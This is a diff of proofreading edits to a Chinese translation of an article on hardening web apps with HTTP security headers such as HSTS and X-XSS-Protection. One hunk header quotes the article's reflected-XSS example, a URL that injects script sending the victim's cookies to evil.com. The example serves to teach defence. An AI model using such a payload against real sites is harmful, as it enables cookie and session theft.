@@ -6,7 +6,7 @@
 
 ## 如何使用 HTTP Headers 来保护你的 Web 应用 ##
 
-众所周知，无论是简单的小网页还是复杂的单页应用，Web 应用都是网络攻击的目标。2016年，这种最主要的攻击模式 —— 攻击 web 应用，造成了大约 [40% 的数据泄露](http://www.verizonenterprise.com/verizon-insights-lab/dbir/2016/)。事实上，现在来说，了解网络安全并不是锦上添花， 而是 **Web 开发者的必需任务**，特别对于构建面向消费者的产品的开发人员。
+众所周知，无论是简单的小网页还是复杂的单页应用，Web 应用都是网络攻击的目标。2016 年，这种最主要的攻击模式 —— 攻击 web 应用，造成了大约 [40% 的数据泄露](http://www.verizonenterprise.com/verizon-insights-lab/dbir/2016/)。事实上，现在来说，了解网络安全并不是锦上添花，而是 **Web 开发者的必需任务**，特别对于构建面向消费者的产品的开发人员。
 
 开发者可以利用 HTTP 响应头来加强 Web 应用程序的安全性，通常只需要添加几行代码即可。本文将介绍 web 开发者如何利用 HTTP Headers 来构建安全的应用。虽然本文的示例代码是 Node.js，但基本所有主流的服务端语言都支持设置 HTTP 响应头，并且都可以简单地对其进行配置。
 
@@ -85,7 +85,7 @@ HSTS 的指令如下：
 
 这是一个强大的指令，强制浏览器**始终**安全加载你的 web 应用程序，即使是第一次收到响应之前加载！这是通过将启用 HSTS 预加载域的列表硬编码到浏览器的代码中实现的。要启用预加载功能，你需要在 Google Chrome 团队维护的网站 [HSTS 预加载列表提交](https://hstspreload.org)注册你的域。
 
-注意谨慎使用 `preload`，因为这意味着它不能轻易撤销，并可能更新延迟数个月。虽然预加载肯定会加强应用程序的安全性，但也意味着你需要充分确信你的应用程序可以支持仅 HTTPS！
+注意谨慎使用 `preload`，因为这意味着它不能轻易撤销，并可能更新延迟数个月。虽然预加载肯定会加强应用程序的安全性，但也意味着你需要充分确信你的应用程序仅支持 HTTPS！
 
 我建议的用法是 `Strict-Transport-Security: max-age=31536000; includeSubDomains;`，这样指示了浏览器强制通过 HTTPS 连接到源主机并且有效期为一年。如果你对你的 app 仅处理 HTTPS 很有信心，我也推荐加上 `preload` 指令，当然别忘记去前面提到的预加载列表注册你的网站。
 
@@ -133,7 +133,7 @@ https://mywebapp.com/search?</p><script>window.location=“http://evil.com?cooki
 
 为了保护用户抵抗反射型 XSS 攻击，有些浏览器实施了保护机制。这些保护机制尝试通过在 HTTP 请求和响应中寻找匹配的代码模式来辨识这些攻击。Internet Explorer 是第一个推出这种机制的，在 2008 年的 IE 8 中引入了 XSS 过滤器的机制，而 WebKit 后来推出了 XSS 审计，现今在 Chrome 和 Safari 上可用（Firefox 没有内置类似的机制，但是用户可以使用插件来获得此功能）。这些保护机制并不完美，它们可能无法检测到真正的 XSS 攻击（漏报），在其他情况可能会阻止合法代码（误判）。由于后一种情况的出现，浏览器允许用户可设置禁用 XSS 过滤功能。不幸的是，这通常是一个全局设置，这会完全关闭所有浏览器加载的 web 应用程序的安全功能。
 
-幸运的是，有方法可以让 web 应用覆盖此配置，并确保浏览器加载的 web 应用已打开 XSS 过滤器。即通过设定 `X-XSS-Protection` 响应头实现。此响应头支持 Internet Explorer （8以上）、Edge、Chrome 和 Safari，指示浏览器打开或关闭内置的保护机制，及覆盖浏览器的本地配置。
+幸运的是，有方法可以让 web 应用覆盖此配置，并确保浏览器加载的 web 应用已打开 XSS 过滤器。即通过设定 `X-XSS-Protection` 响应头实现。此响应头支持 Internet Explorer（IE8 以上）、Edge、Chrome 和 Safari，指示浏览器打开或关闭内置的保护机制，及覆盖浏览器的本地配置。
 
 `X-XSS-Protection` 指令包括:
 
@@ -240,7 +240,7 @@ function requestHandler(req, res){
 
 （**声明：** 此文内容仅属本人，不代表本人过去或现在的雇主。）
 
-（首页图片版权：[Pexels.com](https://www.pexels.com/photo/coffee-writing-computer-blogging-34600/)）
+（*首页图片版权：[Pexels.com](https://www.pexels.com/photo/coffee-writing-computer-blogging-34600/)*）
 
 ---
 
